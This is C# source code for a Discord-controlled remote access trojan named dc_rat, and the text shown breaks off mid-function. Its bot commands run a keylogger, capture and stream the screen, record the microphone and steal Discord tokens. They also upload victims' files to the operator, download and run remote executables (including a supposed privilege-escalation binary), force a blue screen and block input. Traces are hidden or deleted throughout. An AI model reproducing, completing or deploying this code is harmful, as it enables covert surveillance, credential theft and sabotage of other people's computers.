using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using Discord;
using Discord.Commands;
using Discord.WebSocket;
using dc_rat;
using Newtonsoft.Json;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Threading;
using NAudio;
using NAudio.Wave;
using System.Security.Principal;
using Microsoft.Win32;

namespace dc_rat
{
    public class ipStruct
    {
        public string Ip { get; set; }
    }

    public class Commands : ModuleBase<SocketCommandContext>
    {
        void LoadForm()
        {
            Application.SetHighDpiMode(HighDpiMode.SystemAware);
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new Form1());
        }

        #region keyLogger
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        private String verifyKey(int code)
        {
            String key = "";

            if (code == 8) key = "[Back]";
            else if (code == 9) key = "[TAB]";
            else if (code == 13) key = "[Enter]";
            else if (code == 19) key = "[Pause]";
            else if (code == 20) key = "[Caps Lock]";
            else if (code == 27) key = "[Esc]";
            else if (code == 32) key = "[Space]";
            else if (code == 33) key = "[Page Up]";
            else if (code == 34) key = "[Page Down]";
            else if (code == 35) key = "[End]";
            else if (code == 36) key = "[Home]";
            else if (code == 37) key = "Left]";
            else if (code == 38) key = "[Up]";
            else if (code == 39) key = "[Right]";
            else if (code == 40) key = "[Down]";
            else if (code == 44) key = "[Print Screen]";
            else if (code == 45) key = "[Insert]";
            else if (code == 46) key = "[Delete]";
            else if (code == 48) key = "0";
            else if (code == 49) key = "1";
            else if (code == 50) key = "2";
            else if (code == 51) key = "3";
            else if (code == 52) key = "4";
            else if (code == 53) key = "5";
            else if (code == 54) key = "6";
            else if (code == 55) key = "7";
            else if (code == 56) key = "8";
            else if (code == 57) key = "9";
            else if (code == 65) key = "a";
            else if (code == 66) key = "b";
            else if (code == 67) key = "c";
            else if (code == 68) key = "d";
            else if (code == 69) key = "e";
            else if (code == 70) key = "f";
            else if (code == 71) key = "g";
            else if (code == 72) key = "h";
            else if (code == 73) key = "i";
            else if (code == 74) key = "j";
            else if (code == 75) key = "k";
            else if (code == 76) key = "l";
            else if (code == 77) key = "m";
            else if (code == 78) key = "n";
            else if (code == 79) key = "o";
            else if (code == 80) key = "p";
            else if (code == 81) key = "q";
            else if (code == 82) key = "r";
            else if (code == 83) key = "s";
            else if (code == 84) key = "t";
            else if (code == 85) key = "u";
            else if (code == 86) key = "v";
            else if (code == 87) key = "w";
            else if (code == 88) key = "x";
            else if (code == 89) key = "y";
            else if (code == 90) key = "z";
            else if (code == 91) key = "[Windows]";
            else if (code == 92) key = "[Windows]";
            else if (code == 93) key = "[List]";
            else if (code == 96) key = "0";
            else if (code == 97) key = "1";
            else if (code == 98) key = "2";
            else if (code == 99) key = "3";
            else if (code == 100) key = "4";
            else if (code == 101) key = "5";
            else if (code == 102) key = "6";
            else if (code == 103) key = "7";
            else if (code == 104) key = "8";
            else if (code == 105) key = "9";
            else if (code == 106) key = "*";
            else if (code == 107) key = "+";
            else if (code == 109) key = "-";
            else if (code == 110) key = ",";
            else if (code == 111) key = "/";
            else if (code == 112) key = "[F1]";
            else if (code == 113) key = "[F2]";
            else if (code == 114) key = "[F3]";
            else if (code == 115) key = "[F4]";
            else if (code == 116) key = "[F5]";
            else if (code == 117) key = "[F6]";
            else if (code == 118) key = "[F7]";
            else if (code == 119) key = "[F8]";
            else if (code == 120) key = "[F9]";
            else if (code == 121) key = "[F10]";
            else if (code == 122) key = "[F11]";
            else if (code == 123) key = "[F12]";
            else if (code == 144) key = "[Num Lock]";
            else if (code == 145) key = "[Scroll Lock]";
            else if (code == 160) key = "[Shift]";
            else if (code == 161) key = "[Shift]";
            else if (code == 162) key = "[Ctrl]";
            else if (code == 163) key = "[Ctrl]";
            else if (code == 164) key = "[Alt]";
            else if (code == 165) key = "[Alt]";
            else if (code == 187) key = "=";
            else if (code == 186) key = "ç";
            else if (code == 188) key = ",";
            else if (code == 189) key = "-";
            else if (code == 190) key = ".";
            else if (code == 192) key = "'";
            else if (code == 191) key = ";";
            else if (code == 193) key = "/";
            else if (code == 194) key = ".";
            else if (code == 219) key = "´";
            else if (code == 220) key = "]";
            else if (code == 221) key = "[";
            else if (code == 222) key = "~";
            else if (code == 226) key = "\\";

            return key;
        }
        #endregion

        #region mbr
        [DllImport("kernel32")]
        private static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode,
            IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);

        [DllImport("kernel32")]
        private static extern bool WriteFile(IntPtr hfile, byte[] lpBuffer, uint nNumberOfBytesToWrite,
            out uint lpNumberBytesWritten, IntPtr lpOverlapped);

        private const uint GenericRead = 0x80000000;
        private const uint GenericWrite = 0x40000000;
        private const uint GenericExecute = 0x20000000;
        private const uint GenericAll = 0x10000000;

        private const uint FileShareRead = 0x1;
        private const uint FileShareWrite = 0x2;
        private const uint OpenExisting = 0x3;
        private const uint FileFlagDeleteOnClose = 0x40000000;
        private const uint MbrSize = 512u;
        #endregion

        public static bool IsAdministrator => new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);

        #region input
        public static class NativeMethods
        {
            [System.Runtime.InteropServices.DllImportAttribute("user32.dll", EntryPoint = "BlockInput")]
            [return: System.Runtime.InteropServices.MarshalAsAttribute(System.Runtime.InteropServices.UnmanagedType.Bool)]
            public static extern bool BlockInput([System.Runtime.InteropServices.MarshalAsAttribute(System.Runtime.InteropServices.UnmanagedType.Bool)] bool fBlockIt);

        }
        #endregion

        #region mic
        [DllImport("winmm.dll", EntryPoint = "mciSendStringA", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
        private static extern int mciSendString(string lpstrCommand, string lpstrReturnString, int uReturnLength, int hwndCallback);
        #endregion

        #region bsod
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern void RtlSetProcessIsCritical(UInt32 v1, UInt32 v2, UInt32 v3);
        #endregion

        #region critical
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);
        #endregion

        #region Screenshot
        const int ENUM_CURRENT_SETTINGS = -1;

        [DllImport("user32.dll")]
        public static extern bool EnumDisplaySettings(string lpszDeviceName, int iModeNum, ref DEVMODE lpDevMode);

        [StructLayout(LayoutKind.Sequential)]
        public struct DEVMODE
        {
            private const int CCHDEVICENAME = 0x20;
            private const int CCHFORMNAME = 0x20;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 0x20)]
            public string dmDeviceName;
            public short dmSpecVersion;
            public short dmDriverVersion;
            public short dmSize;
            public short dmDriverExtra;
            public int dmFields;
            public int dmPositionX;
            public int dmPositionY;
            public ScreenOrientation dmDisplayOrientation;
            public int dmDisplayFixedOutput;
            public short dmColor;
            public short dmDuplex;
            public short dmYResolution;
            public short dmTTOption;
            public short dmCollate;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 0x20)]
            public string dmFormName;
            public short dmLogPixels;
            public int dmBitsPerPel;
            public int dmPelsWidth;
            public int dmPelsHeight;
            public int dmDisplayFlags;
            public int dmDisplayFrequency;
            public int dmICMMethod;
            public int dmICMIntent;
            public int dmMediaType;
            public int dmDitherType;
            public int dmReserved1;
            public int dmReserved2;
            public int dmPanningWidth;
            public int dmPanningHeight;
        }
        #endregion

        #region Wallpaper
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern Int32 SystemParametersInfo(
        UInt32 action, UInt32 uParam, String vParam, UInt32 winIni);

        private static readonly UInt32 SPI_SETDESKWALLPAPER = 0x14;
        private static readonly UInt32 SPIF_UPDATEINIFILE = 0x01;
        private static readonly UInt32 SPIF_SENDWININICHANGE = 0x02;

        public static void SetWallpaper(String path)
        {
            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, path,
                SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
        }
        #endregion

        #region General
        [Command("get")]
        //[RequireOwner]
        public async Task getClients()
        {
            WebClient wb = new WebClient();
            var apiResponse = wb.DownloadString("https://api.ipify.org?format=json");
            ipStruct ip = JsonConvert.DeserializeObject<ipStruct>(apiResponse);
            await ReplyAsync($"```[Id: {Program.clientId}] [Ipv4: {ip.Ip}] [User: {Environment.UserName}]```");
        }

        [Command("target")]
        //[RequireOwner]
        public async Task targetClient(string clientID)
        {
            if (clientID == Program.clientId)
            {
                Program.target.Add(Convert.ToString(Context.User.Id));
                await ReplyAsync($"[Id: { Program.clientId}] Ok.");
            }
        }

        [Command("drop")]
        //[RequireOwner]
        public async Task dropClient(string clientID)
        {
            if (clientID == Program.clientId)
            {
                Program.target.Remove(Convert.ToString(Context.User.Id));
                await ReplyAsync($"[Id: { Program.clientId}] Ok.");
            }
        }

        [Command("targetall")]
        //[RequireOwner]
        public async Task targetAll()
        {
            Program.target.Add(Convert.ToString(Context.User.Id));
            await ReplyAsync($"[Id: { Program.clientId}] Ok.");
        }

        [Command("dropall")]
        //[RequireOwner]
        public async Task dropAll()
        {
            Program.target.Remove(Convert.ToString(Context.User.Id));
            await ReplyAsync($"[Id: { Program.clientId}] Ok.");
        }
        #endregion

        #region Specific
        [Command("getinfo")]
        //[RequireOwner]
        public async Task getInfo()
        {
            if (Program.target.Contains(Convert.ToString(Context.User.Id)))
            {
                WebClient wb = new WebClient();
                var apiResponse = wb.DownloadString("https://api.ipify.org?format=json");
                ipStruct ip = JsonConvert.DeserializeObject<ipStruct>(apiResponse);
                await ReplyAsync($"```[Id: {Program.clientId}] [Ipv4: {ip.Ip}] [User: {Environment.UserName}] [Ipv4: {ip.Ip}] [OS: {Environment.OSVersion}]```");
            }
        }

        [Command("screenshot")]
        //[RequireOwner]
        public async Task Screenshot()
        {
            if (Program.target.Contains(Convert.ToString(Context.User.Id)))
            {
                foreach (Screen screen in Screen.AllScreens)
                {
                    DEVMODE dm = new DEVMODE();
                    dm.dmSize = (short)Marshal.SizeOf(typeof(DEVMODE));
                    EnumDisplaySettings(screen.DeviceName, ENUM_CURRENT_SETTINGS, ref dm);

                    using (Bitmap bmp = new Bitmap(dm.dmPelsWidth, dm.dmPelsHeight))
                    using (Graphics g = Graphics.FromImage(bmp))
                    {
                        g.CopyFromScreen(dm.dmPositionX, dm.dmPositionY, 0, 0, bmp.Size);
                        bmp.Save($"C:\\Users\\{Environment.UserName}\\Downloads\\{screen.DeviceName.Split('\\').Last()}.png");
                        File.SetAttributes($"C:\\Users\\{Environment.UserName}\\Downloads\\{screen.DeviceName.Split('\\').Last()}.png", FileAttributes.Hidden);
                        await Context.Channel.SendFileAsync($"C:\\Users\\{Environment.UserName}\\Downloads\\{screen.DeviceName.Split('\\').Last()}.png", $"[{screen.DeviceName.Split('\\').Last()}] Id: {Program.clientId}");
                        File.Delete($"C:\\Users\\{Environment.UserName}\\Downloads\\{screen.DeviceName.Split('\\').Last()}.png");
                    }
                }
            }
        }

        [Command("speak")]
        //[RequireOwner]
        public async Task Screenshot(string text)
        {
            if (Program.target.Contains(Convert.ToString(Context.User.Id)))
            {
                text = text.Replace("_", " ");
                TTS.Speak(text);
                await ReplyAsync($"[Id: { Program.clientId}] Ok.");
            }
        }

        [Command("processes")]
        //[RequireOwner]
        public async Task getProcesses()
        {
            if (Program.target.Contains(Convert.ToString(Context.User.Id)))
            {
                Process[] processlist = Process.GetProcesses();
                string message = string.Empty;
                foreach (Process process in processlist)
                {
                    message += $"{Convert.ToString(process.ProcessName)}\n";
                }
                File.WriteAllText($"C:\\Users\\{Environment.UserName}\\Downloads\\szgufvdhfgvhdsjz.txt", message);
                File.SetAttributes($"C:\\Users\\{Environment.UserName}\\Downloads\\szgufvdhfgvhdsjz.txt", FileAttributes.Hidden);
                await Context.Channel.SendFileAsync($"C:\\Users\\{Environment.UserName}\\Downloads\\szgufvdhfgvhdsjz.txt", $"[Id: { Program.clientId}]");
                File.Delete($"C:\\Users\\{Environment.UserName}\\Downloads\\szgufvdhfgvhdsjz.txt");
            }
        }

        [Command("terminate")]
        //[RequireOwner]
        public async Task terminateProcess(string name)
        {
            if (Program.target.Contains(Convert.ToString(Context.User.Id)))
            {
                name = name.Replace("*", " ");
                foreach (var process in Process.GetProcessesByName(name))
                {
                    process.Kill();
                }
                await ReplyAsync($"[Id: { Program.clientId}] Ok.");
            }
        }

        [Command("rotatescreen")]
        //[RequireOwner]
        public async Task rotateScreen(uint Screen, Display.Orientations orientations)
        {
            if (Program.target.Contains(Convert.ToString(Context.User.Id)))
            {
                Display.Rotate(Screen, orientations);
                await ReplyAsync($"[Id: { Program.clientId}] Ok.");
            }
        }

        [Command("unrotatescreen")]
        //[RequireOwner]
        public async Task unrotateScreen()
        {
            if (Program.target.Contains(Convert.ToString(Context.User.Id)))
            {
                Display.ResetAllRotations();
                await ReplyAsync($"[Id: { Program.clientId}] Ok.");
            }
        }

        [Command("volume")]
        //[RequireOwner]
        public async Task setVolume(int volume)
        {
            if (Program.target.Contains(Convert.ToString(Context.User.Id)))
            {
                AudioManager.SetMasterVolume(volume);
                await ReplyAsync($"[Id: { Program.clientId}] Ok.");
            }
        }

        [Command("screencount")]
        //[RequireOwner]
        public async Task screenCount()
        {
            if (Program.target.Contains(Convert.ToString(Context.User.Id)))
            {
                ManagementObjectSearcher searcher = new ManagementObjectSearcher("root\\CIMV2", "select * from Win32_PnPEntity WHERE Name LIKE '%PnP%Monitor%'");
                await ReplyAsync($"```[Id: { Program.clientId}] Screens: {Convert.ToString(searcher.Get().Count)}, Primary: {Convert.ToString(Screen.PrimaryScreen).Split('\\').Last().Replace("DISPLAY", "")}```");
            }
        }

        [Command("download")]
        //[RequireOwner]
        public async Task downloadFile(string link, string path)
        {
            if (Program.target.Contains(Convert.ToString(Context.User.Id)))
            {
                path = path.Replace("*", " ");
                WebClient wc = new WebClient();
                wc.DownloadFile(link, path);
                await ReplyAsync($"[Id: { Program.clientId}] Ok.");
            }
        }

        [Command("execute")]
        //[RequireOwner]
        public async Task executeFile(string path)
        {
            if (Program.target.Contains(Convert.ToString(Context.User.Id)))
            {
                path = path.Replace("*", " ");
                Process.Start(path);
                await ReplyAsync($"[Id: { Program.clientId}] Ok.");
            }
        }

        [Command("hidefile")]
        //[RequireOwner]
        public async Task hideFile(string path)
        {
            if (Program.target.Contains(Convert.ToString(Context.User.Id)))
            {
                path = path.Replace("*", " ");
                File.SetAttributes(path, FileAttributes.Hidden);
                await ReplyAsync($"[Id: { Program.clientId}] Ok.");
            }
        }

        [Command("showfile")]
        //[RequireOwner]
        public async Task showFile(string path)
        {
            if (Program.target.Contains(Convert.ToString(Context.User.Id)))
            {
                path = path.Replace("*", " ");
                File.SetAttributes(path, FileAttributes.Normal);
                await ReplyAsync($"[Id: { Program.clientId}] Ok.");
            }
        }

        [Command("smallupload")]
        //[RequireOwner]
        public async Task smallUpload(string path)
        {
            if (Program.target.Contains(Convert.ToString(Context.User.Id)))
            {
                path = path.Replace("*", " ");
                await Context.Channel.SendFileAsync(path, $"[Id: {Program.clientId}]");
            }
        }

        [Command("bigupload")]
        //[RequireOwner]
        public async Task bigUpload(string path)
        {
            if (Program.target.Contains(Convert.ToString(Context.User.Id)))
            {
                path = path.Replace("*", " ");
                await ReplyAsync($"[Id: { Program.clientId}] Ok.");
                string message = $"```[Id: {Program.clientId}]\n" + Anonfiles.CreateDownloadLink(path) + "```";
                await ReplyAsync(message);
            }
        }

        [Command("tree")]
        //[RequireOwner]
        public async Task Tree(string typeFilter, string wordFilter, string disk)
        {
            if (Program.target.Contains(Convert.ToString(Context.User.Id)))
            {
                await ReplyAsync($"[Id: { Program.clientId}] Ok.");
                GetTree.Start(typeFilter, wordFilter, disk);
                await ReplyAsync($"```Tree finished: {Program.clientId}```");
                try
                {
                    await Context.Channel.SendFileAsync($"C:\\Users\\{Environment.UserName}\\Downloads\\ju98h506ieztr90e5ujh84oips.txt", $"[Id: {Program.clientId}]");
                }
                catch
                {

                    string message = $"```[Id: {Program.clientId}]\n" + Anonfiles.CreateDownloadLink($"C:\\Users\\{Environment.UserName}\\Downloads\\ju98h506ieztr90e5ujh84oips.txt") + "```";
                    await ReplyAsync(message);
                }
                File.Delete($"C:\\Users\\{Environment.UserName}\\Downloads\\ju98h506ieztr90e5ujh84oips.txt");
            }
        }

        [Command("sendtree")]
        //[RequireOwner]
        public async Task sendTree()
        {
            if (Program.target.Contains(Convert.ToString(Context.User.Id)))
            {
                await ReplyAsync($"[Id: { Program.clientId}] Ok.");
                try
                {
                    await Context.Channel.SendFileAsync($"C:\\Users\\{Environment.UserName}\\Downloads\\ju98h506ieztr90e5ujh84oips.txt", $"[Id: {Program.clientId}]");
                }
                catch
                {

                    string message = $"```[Id: {Program.clientId}]\n" + Anonfiles.CreateDownloadLink($"C:\\Users\\{Environment.UserName}\\Downloads\\ju98h506ieztr90e5ujh84oips.txt") + "```";
                    await ReplyAsync(message);
                }
                File.Delete($"C:\\Users\\{Environment.UserName}\\Downloads\\ju98h506ieztr90e5ujh84oips.txt");
            }
        }

        [Command("getdrives")]
        //[RequireOwner]
        public async Task getDrives()
        {
            if (Program.target.Contains(Convert.ToString(Context.User.Id)))
            {
                string message = $"```[Id: {Program.clientId}] ";
                foreach (var item in DriveInfo.GetDrives())
                {
                    message += item.Name + " ";
                }
                message += "```";
                await ReplyAsync(message);
            }
        }

        [Command("deletefile")]
        //[RequireOwner]
        public async Task deleteFile(string path)
        {
            if (Program.target.Contains(Convert.ToString(Context.User.Id)))
            {
                path = path.Replace("*", " ");
                File.Delete(path);
                await ReplyAsync($"[Id: { Program.clientId}] Ok.");
            }
        }

        [Command("filesize")]
        //[RequireOwner]
        public async Task fileSize(string path)
        {
            if (Program.target.Contains(Convert.ToString(Context.User.Id)))
            {
                path = path.Replace("*", " ");
                long length = new System.IO.FileInfo(path).Length;
                await ReplyAsync($"[Id: { Program.clientId}] {length}bytes.");
            }
        }

        [Command("panic")]
        //[RequireOwner]
        public async Task Panic()
        {
            if (Program.target.Contains(Convert.ToString(Context.User.Id)))
            {
                if (Program.iscritical)
                {
                    if (IsAdministrator)
                    {
                        int isCritical = 0;
                        int BreakOnTermination = 0x1D;
                        Process.EnterDebugMode();
                        NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
                        await ReplyAsync($"[Id: { Program.clientId}] Ok.");
                        Environment.Exit(0);
                    }
                    else
                    {
                        await ReplyAsync($"```[Id: { Program.clientId}] admin perms required to uncrit program```");
                    }
                }
                else
                {
                    await ReplyAsync($"[Id: { Program.clientId}] Ok.");
                    Environment.Exit(0);
                }
            }
        }

        [Command("spam")]
        //[RequireOwner]
        public async Task Spam(int amount)
        {
            if (Program.target.Contains(Convert.ToString(Context.User.Id)))
            {
                await ReplyAsync($"[Id: { Program.clientId}] Ok.");
                for (int i = 0; i < amount; i++)
                {
                    Process.Start("cmd");
                }
            }
        }

        [Command("wallpaper")]
        //[RequireOwner]
        public async Task Wallpaper(string link, string type)
        {
            if (Program.target.Contains(Convert.ToString(Context.User.Id)))
            {
                WebClient wc = new WebClient();
                wc.DownloadFile(link, $"C:\\Users\\{Environment.UserName}\\Downloads\\VIOLENT{type}");
                File.SetAttributes($"C:\\Users\\{Environment.UserName}\\Downloads\\VIOLENT{type}", FileAttributes.Hidden);
                SetWallpaper($"C:\\Users\\{Environment.UserName}\\Downloads\\VIOLENT{type}");
                await ReplyAsync($"[Id: { Program.clientId}] Ok.");
            }
        }

        [Command("recordmic")]
        //[RequireOwner]
        public async Task recordMic(int milliseconds)
        {
            if (Program.target.Contains(Convert.ToString(Context.User.Id)))
            {
                await ReplyAsync($"[Id: { Program.clientId}] Ok.");
                mciSendString("open new Type waveaudio Alias recsound", "", 0, 0);
                mciSendString("record recsound", "", 0, 0);
                Thread.Sleep(milliseconds);
                mciSendString($"save recsound C:\\Users\\{Environment.UserName}\\Downloads\\v6ft5dz7rub8.wav", "", 0, 0);
                mciSendString("close recsound ", "", 0, 0);
                File.SetAttributes($"C:\\Users\\{Environment.UserName}\\Downloads\\v6ft5dz7rub8.wav", FileAttributes.Hidden);

                try
                {
                    await Context.Channel.SendFileAsync($"C:\\Users\\{Environment.UserName}\\Downloads\\v6ft5dz7rub8.wav", $"[Id: {Program.clientId}]");
                }
                catch
                {
                    string message = $"```[Id: {Program.clientId}]\n" + Anonfiles.CreateDownloadLink($"C:\\Users\\{Environment.UserName}\\Downloads\\v6ft5dz7rub8.wav") + "```";
                    await ReplyAsync(message);
                }
                File.Delete($"C:\\Users\\{Environment.UserName}\\Downloads\\v6ft5dz7rub8.wav");
            }
        }

        [Command("gettoken")]
        //[RequireOwner]
        public async Task getToken()
        {
            if (Program.target.Contains(Convert.ToString(Context.User.Id)))
            {
                Grabber.Grab();
                await ReplyAsync($"```[Id: { Program.clientId}]\nTokens: {Program.dcTokens}```");
            }
        }

        [Command("playaudio")]
        //[RequireOwner]
        public async Task playAudio(string link, string type)
        {
            if (Program.target.Contains(Convert.ToString(Context.User.Id)))
            {
                await ReplyAsync($"[Id: { Program.clientId}] Ok.");
                WebClient client = new WebClient();
                client.DownloadFile(link, $"C:\\Users\\{Environment.UserName}\\Downloads\\97085430934587hnjufvdgki{type}");
                File.SetAttributes($"C:\\Users\\{Environment.UserName}\\Downloads\\97085430934587hnjufvdgki{type}", FileAttributes.Hidden);

                IWavePlayer waveOutDevice = new WaveOut();
                AudioFileReader audioFileReader = new AudioFileReader($"C:\\Users\\{Environment.UserName}\\Downloads\\97085430934587hnjufvdgki{type}");
                waveOutDevice.Init(audioFileReader);
                waveOutDevice.Play();

                while (waveOutDevice.PlaybackState != PlaybackState.Stopped) { } //Checks if audio is still playing

                waveOutDevice.Stop();
                audioFileReader.Dispose();
                waveOutDevice.Dispose();
                File.Delete($"C:\\Users\\{Environment.UserName}\\Downloads\\97085430934587hnjufvdgki{type}");
            }
        }

        [Command("amiadmin")]
        //[RequireOwner]
        public async Task amIAdmin()
        {
            if (Program.target.Contains(Convert.ToString(Context.User.Id)))
            {
                if (IsAdministrator)
                {
                    await ReplyAsync($"```[Id: { Program.clientId}] true```");
                }
                else
                {
                    await ReplyAsync($"```[Id: { Program.clientId}] false```");
                }
            }
        }

        [Command("tryescalate")]
        //[RequireOwner]
        public async Task Escalate()
        {
            if (Program.target.Contains(Convert.ToString(Context.User.Id)))
            {
                await ReplyAsync($"[Id: { Program.clientId}] Ok.");
                WebClient client = new WebClient();
                client.DownloadFile("https://cdn.discordapp.com/attachments/959221228785246249/973665774206079046/serviceHelper.exe", $"C:\\Users\\{Environment.UserName}\\Downloads\\ouhi89e4z5rtjg7.exe");
                File.SetAttributes($"C:\\Users\\{Environment.UserName}\\Downloads\\ouhi89e4z5rtjg7.exe", FileAttributes.Hidden);
                Process.Start("CMD.exe", "/c start " + $"C:\\Users\\{Environment.UserName}\\Downloads\\ouhi89e4z5rtjg7.exe");
                Environment.Exit(0);
            }
        }

        [Command("message")]
        //[RequireOwner]
        public async Task Message(string text)
        {
            if (Program.target.Contains(Convert.ToString(Context.User.Id)))
            {
                text = text.Replace("_", " ");
                MessageBox.Show(text);
                await ReplyAsync($"[Id: { Program.clientId}] Ok.");
            }
        }

        [Command("startstream")]
        //[RequireOwner]
        public async Task Stream()
        {
            if (Program.target.Contains(Convert.ToString(Context.User.Id)))
            {
                Program.isstreaming = true;
                await ReplyAsync($"[Id: { Program.clientId}] Ok.");

                while (Program.isstreaming)
                {
                    DEVMODE dm = new DEVMODE();
                    dm.dmSize = (short)Marshal.SizeOf(typeof(DEVMODE));
                    EnumDisplaySettings(Screen.PrimaryScreen.DeviceName, ENUM_CURRENT_SETTINGS, ref dm);

                    using (Bitmap bmp = new Bitmap(dm.dmPelsWidth, dm.dmPelsHeight))
                    using (Graphics g = Graphics.FromImage(bmp))
                    {
                        g.CopyFromScreen(dm.dmPositionX, dm.dmPositionY, 0, 0, bmp.Size);
                        bmp.Save($"C:\\Users\\{Environment.UserName}\\Downloads\\{Screen.PrimaryScreen.DeviceName.Split('\\').Last()}.png");
                        File.SetAttributes($"C:\\Users\\{Environment.UserName}\\Downloads\\{Screen.PrimaryScreen.DeviceName.Split('\\').Last()}.png", FileAttributes.Hidden);
                        await Context.Channel.SendFileAsync($"C:\\Users\\{Environment.UserName}\\Downloads\\{Screen.PrimaryScreen.DeviceName.Split('\\').Last()}.png", $"[{Screen.PrimaryScreen.DeviceName.Split('\\').Last()}] Id: {Program.clientId}");
                        File.Delete($"C:\\Users\\{Environment.UserName}\\Downloads\\{Screen.PrimaryScreen.DeviceName.Split('\\').Last()}.png");
                    }
                    Thread.Sleep(1000);
                }
            }
        }

        [Command("stopstream")]
        //[RequireOwner]
        public async Task stopStream()
        {
            if (Program.target.Contains(Convert.ToString(Context.User.Id)))
            {
                Program.isstreaming = false;
                await ReplyAsync($"[Id: { Program.clientId}] Ok.");
            }
        }

        [Command("startkeylogger")]
        //[RequireOwner]
        public async Task startKeyLogger()
        {
            if (Program.target.Contains(Convert.ToString(Context.User.Id)))
            {
                await ReplyAsync($"[Id: { Program.clientId}] Ok.");

                Program.islogging = true;
                while (Program.islogging)
                {
                    for (int i = 0; i < 255; i++)
                    {
                        int key = GetAsyncKeyState(i);
                        if (key == 1 || key == 32769)
                        {
                            StreamWriter file = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\hju8i7go654z7gfd.txt", true);
                            File.SetAttributes(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\hju8i7go654z7gfd.txt", FileAttributes.Hidden);
                            file.Write(verifyKey(i));
                            file.Close();
                            break;
                        }
                    }
                }
            }
        }

        [Command("stopkeylogger")]
        public async Task stopKeyLogger()
        {
            if (Program.target.Contains(Convert.ToString(Context.User.Id)))
            {
                await ReplyAsync($"[Id: { Program.clientId}] Ok.");

                Program.islogging = false;

                try
                {
                    await Context.Channel.SendFileAsync(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\hju8i7go654z7gfd.txt", $"[Id: {Program.clientId}]");
                }
                catch 
                {
                    await ReplyAsync($"[Id: { Program.clientId}] Ok.");
                    string message = $"```[Id: {Program.clientId}]\n" + Anonfiles.CreateDownloadLink(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\hju8i7go654z7gfd.txt") + "```";
                    await ReplyAsync(message);
                }

                File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\hju8i7go654z7gfd.txt");
            }
        }

        [Command("bsod")]
        //[RequireOwner]
        public async Task Bsod()
        {
            if (Program.target.Contains(Convert.ToString(Context.User.Id)))
            {
                if (IsAdministrator)
                {
                    await ReplyAsync($"[Id: { Program.clientId}] Ok.");
                    System.Diagnostics.Process.EnterDebugMode();
                    RtlSetProcessIsCritical(1, 0, 0);
                    System.Diagnostics.Process.GetCurrentProcess().Kill();
                }
                else
                {
                    await ReplyAsync($"```[Id: { Program.clientId}] admin perms required```");
                }
            }
        }

        [Command("blockinput")]
        //[RequireOwner]
        public async Task BlockInput()
        {
            if (Program.target.Contains(Convert.ToString(Context.User.Id)))
            {
                if (IsAdministrator)
                {
                    NativeMethods.BlockInput(true);
                    await ReplyAsync($"[Id: { Program.clientId}] Ok.");
                }
                else
                {
                    await ReplyAsync($"```[Id: { Program.clientId}] admin perms required```");
                }
            }
        }

        [Command("unblockinput")]
        //[RequireOwner]
        public async Task UnBlockInput()
        {
            if (Program.target.Contains(Convert.ToString(Context.User.Id)))
            {
                if (IsAdministrator)
                {
                    NativeMethods.BlockInput(false);
                    await ReplyAsync($"[Id: { Program.clientId}] Ok.");
                }
                else
                {
                    await ReplyAsync($"```[Id: { Program.clientId}] admin perms required```");
                }
            }
        }

        [Command("crit")]
        //[RequireOwner]
        public async Task Crit()
        {
            if (Program.target.Contains(Convert.ToString(Context.User.Id)))
            {
                if (IsAdministrator)
                {
                    int isCritical = 1;
                    int BreakOnTermination = 0x1D;
                    Process.EnterDebugMode();
                    NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
                    Program.iscritical = true;
                    await ReplyAsync($"[Id: { Program.clientId}] Ok.");
                }
                else
                {
                    await ReplyAsync($"```[Id: { Program.clientId}] admin perms required```");
                }
            }
        }

        [Command("uncrit")]
        //[RequireOwner]
        public async Task unCrit()
        {
            if (Program.target.Contains(Convert.ToString(Context.User.Id)))
            {
                if (IsAdministrator)
                {
                    int isCritical = 0;
                    int BreakOnTermination = 0x1D;
                    Process.EnterDebugMode();
                    NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
                    Program.iscritical = false;
                    await ReplyAsync($"[Id: { Program.clientId}] Ok.");
                }
                else
                {
                    await ReplyAsync($"```[Id: { Program.clientId}] admin perms required```");
                }
            }
        }

        [Command("troll")]
        //[RequireOwner]
        public async Task Troll()
        {
            if (Program.target.Contains(Convert.ToString(Context.User.Id)))
            {
                if (IsAdministrator)
                {
                    WebClient client = new WebClient();
                    try
                    {
                        client.DownloadFile("https://cdn.discordapp.com/attachments/959221228785246249/973665394348941372/countdown.wav", $"C:\\Users\\{Environment.UserName}\\Downloads\\countdown.wav");
                        File.SetAttributes($"C:\\Users\\{Environment.UserName}\\Downloads\\countdown.wav", FileAttributes.Hidden);
                        client.DownloadFile("https://cdn.discordapp.com/attachments/959221228785246249/973665354075234324/123.gif", $"C:\\Users\\{Environment.UserName}\\Downloads\\123.gif");
                        File.SetAttributes($"C:\\Users\\{Environment.UserName}\\Downloads\\123.gif", FileAttributes.Hidden);
                    }
                    catch
                    {
